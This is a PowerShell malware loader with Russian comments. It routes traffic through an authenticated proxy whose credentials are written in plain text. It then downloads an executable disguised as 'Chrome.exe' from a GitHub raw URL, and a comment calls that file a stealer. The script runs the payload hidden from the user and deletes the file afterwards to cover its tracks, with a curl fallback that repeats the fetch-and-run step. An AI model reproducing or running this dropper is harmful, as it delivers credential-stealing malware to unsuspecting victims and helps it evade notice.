# ============================================================
# Простой загрузчик клиента через прокси
# ============================================================

# 1. Настройка глобального прокси (для всех программ, запущенных из этого процесса)
$env:HTTP_PROXY = "http://user-xpx93ax5:5pxp942ldb7jtnh2@gate.proxydata.ru:3129"
$env:HTTPS_PROXY = "http://user-xpx93ax5:5pxp942ldb7jtnh2@gate.proxydata.ru:3129"
[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy("http://gate.proxydata.ru:3129", $true)
[System.Net.WebRequest]::DefaultWebProxy.Credentials = New-Object System.Net.NetworkCredential("user-xpx93ax5", "5pxp942ldb7jtnh2")

# 2. Скачиваем клиент (стилер) с GitHub
$clientUrl = "https://raw.githubusercontent.com/eblan0421-lab/legendarypupsik/refs/heads/main/Chrome.exe"   # или твой EXE
$outPath = "$env:TEMP\client.exe"

# 3. Скачиваем через WebClient (прокси уже установлен)
try {
    (New-Object System.Net.WebClient).DownloadFile($clientUrl, $outPath)
} catch {
    # fallback через Invoke-WebRequest (тоже использует глобальный прокси)
    Invoke-WebRequest -Uri $clientUrl -OutFile $outPath
}

# 4. Если скачалось – запускаем скрыто
if (Test-Path $outPath) {
    Start-Process -FilePath $outPath -WindowStyle Hidden
    # Удаляем файл через 10 секунд (если стилер не зависит от файла)
    Start-Sleep -Seconds 10
    Remove-Item $outPath -Force -ErrorAction SilentlyContinue
} else {
    # если не скачалось – пробуем через curl с явным прокси
    $proxyAuth = "user-xpx93ax5:5pxp942ldb7jtnh2"
    $proxyUrl = "http://gate.proxydata.ru:3129"
    curl.exe -x $proxyUrl -U $proxyAuth -L $clientUrl -o $outPath
    if (Test-Path $outPath) { Start-Process -FilePath $outPath -WindowStyle Hidden }
}
